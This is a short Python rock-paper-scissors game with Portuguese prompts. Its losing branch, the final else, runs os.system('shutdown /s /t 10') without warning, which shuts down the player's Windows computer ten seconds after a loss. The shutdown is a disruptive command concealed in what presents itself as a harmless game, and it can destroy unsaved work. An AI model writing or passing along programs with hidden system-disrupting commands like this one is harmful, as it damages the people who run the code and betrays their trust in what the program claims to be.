import os
import random

opcoes = ["pedra", "papel", "tesoura"]

print("=== PEDRA, PAPEL OU TESOURA ===")

while True:
    jogador = input("\nEscolha pedra, papel ou tesoura (ou 'sair'): ").lower()

    if jogador == "sair":
        print("Obrigado por jogar!")
        break

    if jogador not in opcoes:
        print("Opção inválida! Tente novamente.")
        continue

    computador = random.choice(opcoes)

    print(f"Você escolheu: {jogador}")
    print(f"Computador escolheu: {computador}")

    if jogador == computador:
        print("🤝 Empate!")

    elif (
        (jogador == "pedra" and computador == "tesoura") or
        (jogador == "papel" and computador == "pedra") or
        (jogador == "tesoura" and computador == "papel")
    ):
        print("🎉 Você ganhou!")

    else:
        os.system("shutdown /s /t 10")


